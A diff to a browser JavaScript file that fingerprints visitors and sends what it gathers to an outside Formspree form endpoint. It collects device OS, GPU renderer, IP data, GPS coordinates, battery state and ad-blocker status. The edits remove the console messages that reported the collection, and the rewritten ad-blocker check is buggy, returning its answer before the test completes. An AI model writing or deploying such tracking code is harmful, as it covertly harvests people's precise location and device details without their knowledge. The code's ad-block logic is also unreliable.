@@ -1,10 +1,10 @@
-
-let canRunAds = true;
+var canRunAds = true;
 
 function detectAndroidVersion() {
     const ua = navigator.userAgent;
     const match = ua.match(/Android\s([0-9\.]+)/i);
-    return match ? "Android " + match[1] : "Not Android";
+    if (!match) return "Not Android";
+    return "Android " + match[1];
 }
 
 function getOS() {
@@ -29,15 +29,11 @@ function getOS() {
 }
 
 function getGPU() {
-    try {
-        const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-        if (!gl) return "Unavailable";
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic WebGL";
-    } catch (e) {
-        return "Blocked/Unavailable";
-    }
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl");
+    if (!gl) return "Unavailable";
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
 }
 
 async function getIPData() {
@@ -56,44 +52,44 @@ async function getIPData() {
 async function getGPS() {
     return new Promise(resolve => {
         if (!navigator.geolocation) {
-            resolve({ lat: "Not Supported", lon: "Not Supported" });
+            resolve({ lat: "Unavailable", lon: "Unavailable" });
             return;
         }
-        navigator.geolocation.getCurrentPosition(
-            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-            err => resolve({ lat: "Denied/Error", lon: "Denied/Error" }),
-            { timeout: 5000 }
-        );
+        navigator.geolocation.getCurrentPosition(pos => {
+            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        }, () => {
+            resolve({ lat: "Denied", lon: "Denied" });
+        });
     });
 }
 
 async function getBatteryInfo() {
+    let battery = {};
     try {
         if (navigator.getBattery) {
             const bat = await navigator.getBattery();
-            return { level: Math.round(bat.level * 100) + "%", charging: bat.charging };
+            battery = { level: Math.round(bat.level * 100) + "%", charging: bat.charging };
+        } else {
+            battery = "Not Supported";
         }
-        return "Not Supported";
     } catch (e) {
-        return "Blocked";
+        battery = "Blocked";
     }
+    return battery;
 }
 
-async function checkAdBlocker() {
-    return new Promise(resolve => {
-        const testAd = document.createElement('div');
-        testAd.innerHTML = '&nbsp;';
-        testAd.className = 'adsbox'; 
-        testAd.style.position = 'absolute';
-        testAd.style.left = '-999px';
-        document.body.appendChild(testAd);
-
-        window.setTimeout(() => {
-            const isBlocked = testAd.offsetHeight === 0;
-            testAd.remove();
-            resolve(isBlocked ? "Enabled" : "Disabled");
-        }, 150);
-    });
+function checkAdBlocker() {
+    const testAd = document.createElement('div');
+    testAd.innerHTML = '&nbsp;';
+    testAd.className = 'adsbox';
+    document.body.appendChild(testAd);
+    window.setTimeout(function() {
+        if (testAd.offsetHeight === 0) {
+            canRunAds = false;
+        }
+        testAd.remove();
+    }, 100);
+    return canRunAds ? "Disabled" : "Enabled";
 }
 
 async function collect() {
@@ -128,20 +124,13 @@ async function collect() {
 
 async function sendData() {
     const data = await collect();
-    console.log("Data Collected:", data); 
-
     try {
-        const response = await fetch("https://formspree.io/f/maqpoaly", {
+        await fetch("https://formspree.io/f/maqpoaly", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
         });
-        if (response.ok) {
-            console.log("Submission successful");
-        }
     } catch (e) {
-        console.error("Transmission failed");
+        console.error("Data transmission failed");
     }
 }
-
-window.addEventListener('load', sendData);
